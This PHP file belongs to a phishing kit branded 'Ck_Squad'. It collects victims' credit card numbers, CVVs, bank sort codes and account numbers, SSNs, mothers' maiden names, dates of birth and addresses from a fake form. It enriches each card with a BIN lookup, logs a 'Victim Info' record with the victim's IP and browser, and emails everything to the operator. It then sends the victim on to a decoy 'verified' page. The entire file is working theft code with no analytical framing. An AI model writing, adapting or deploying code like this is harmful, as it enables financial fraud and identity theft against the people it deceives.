<?php

include('../blocker.php');
include('../detect.php');
include('../function.php');

$datei = fopen("../ck_squad_logs/cc.txt","r");
$count = fgets($datei,1000);
fclose($datei);
$count=$count + 1 ;

$datei = fopen("../ck_squad_logs/cc.txt","w");
fwrite($datei, $count);
fclose($datei);

$bin = str_replace(' ', '', $_POST['cc_number']);
$bin = substr($bin, 0, 6);
$getbank = json_decode(file_get_contents("https://lookup.binlist.net/".$bin.""));
$ccbrand = $getbank->brand;
$cctype = $getbank->type;
$ccklas = $getbank->scheme;
$namabank = $getbank->bank->name;
$namacountry = $getbank->country->name;
$message ="
[$$$-------------- Ck_Squad Credit Card --------------$$$]
Cardholder Name :  ".$_POST['cc_holder']."
Card Number     :  ".$_POST['cc_number']."
Expiration Date :  ".$_POST['expdate_month']." / ".$_POST['expdate_year']."
Cvv2            :  ".$_POST['cvv2_number']."
BIN/IIN Info    :  " . $namabank . " - ". $ccbrand . " - ". $cctype ." - ".$ccklas."
        
[$$$------------ Ck_Squad Additional Info ------------$$$]
Sort Code       :  ".$_POST['sort_code1']." - ".$_POST['sort_code2']." - ".$_POST['sort_code3']."
Account number  :  ".$_POST['accnum']."
BSB - OSID      :  " . $_POST['bsbnum_1'] . " - " . $_POST['bsbnum_2'] . "
Credit Limit    :  " . $_POST['cc_limit'] . "
Mother's name   :  ".$_POST['mmd']."
        
[$$$------------- Ck_Squad Address Info --------------$$$]
Account Name    :  ".$_POST['full_name']."
Address Line 1  :  ".$_POST['address1']."
Address Line 2  :  ".$_POST['address2']."
City/Town       :  ".$_POST['city']."
State           :  ".$_POST['state']."
Zip/PostCode    :  ".$_POST['postal']."
Country         :  ".$nama_negara."
Phone Number    :  ".$_POST['phone']."
SSN             :  ".$_POST['ssn1']." - ".$_POST['ssn2']." - ".$_POST['ssn3']."
ID Number       :  ".$_POST['id_number']."
DOB             :  ".$_POST['dob_day']." / ".$_POST['dob_month']." / ".$_POST['dob_year']."

[$$$-------------- Ck_Squad Victim Info --------------$$$]
From            :  ".$ip." | ".$nama_negara." | " . $state . " | " . $kota . " On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."

[$$$------------ END Ck_Squad Credit Card ------------$$$]
";
crypto($message);

include('../ck_squad_settings.php');
$subject = "CC - " . $bin . " " . $ccbrand . " ". $cctype ." ".$ccklas." " . $namabank . " [ ".$nama_negara." | " . $ip . " ]";
$headers = "From: Credit Card <cc@cksquad.business>";
mail($ck_squad_email, $subject, $message, $headers);

header("LOCATION: verified.php?cmd=_update-information&session=".md5(microtime())."&dispatch=".sha1(microtime())."");


?>